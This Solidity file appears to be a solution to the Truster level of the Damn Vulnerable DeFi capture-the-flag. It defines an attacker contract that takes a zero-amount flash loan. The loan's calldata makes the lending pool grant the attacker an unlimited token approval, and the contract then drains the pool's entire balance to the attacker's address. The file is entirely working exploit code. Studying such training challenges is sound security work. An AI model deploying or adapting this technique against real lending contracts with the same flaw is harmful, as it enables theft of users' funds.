// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

interface IPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

contract TrusterAttacker {
    using Address for address;
    DamnValuableToken public immutable token;
    IPool public pool;
    address public attacker;

    constructor(address _token, address _pool) {
        token = DamnValuableToken(_token);
        pool = IPool(_pool);
        attacker = msg.sender;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            2 ** 256 - 1
        );
        pool.flashLoan(0, address(this), address(token), data);
        uint256 balance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), attacker, balance);
    }
}
